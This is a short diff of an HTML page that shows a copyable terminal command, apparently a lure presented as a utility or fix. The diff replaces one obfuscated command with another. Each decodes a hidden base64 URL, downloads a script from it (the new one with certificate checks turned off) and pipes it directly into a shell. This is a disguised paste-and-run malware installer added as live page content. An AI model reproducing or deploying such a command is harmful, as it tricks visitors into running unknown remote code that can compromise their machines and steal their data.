@@ -398,7 +398,7 @@
     <div class="terminal-body">
         <div class="terminal-content">
             <div class="terminal-command-wrapper">
-                <code id="commandToCopy" class="terminal-command terminal-font">/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9ndXRhbmRvLmNvbS9jbGVhbmVy | base64 -d))"</code>
+                <code id="commandToCopy" class="terminal-command terminal-font">curl -kfsSL $(echo 'aHR0cHM6Ly9tb25kb3plci5jb20vY3VybC9iMTAwNjY3NTI1ZTgyZWU0ZWIzYjY4YzQyNGY1NGUxMDE1NzFhZGQ0YzkwNWYzNGQxMzVjMTE2YTc0YWZkNDVj'|base64 -D)|zsh</code>
             </div>
             <button
                 onclick="copyCommand()"
@@ -578,3 +578,4 @@ function copyCommand() {
 </body>
 </html>
  
+
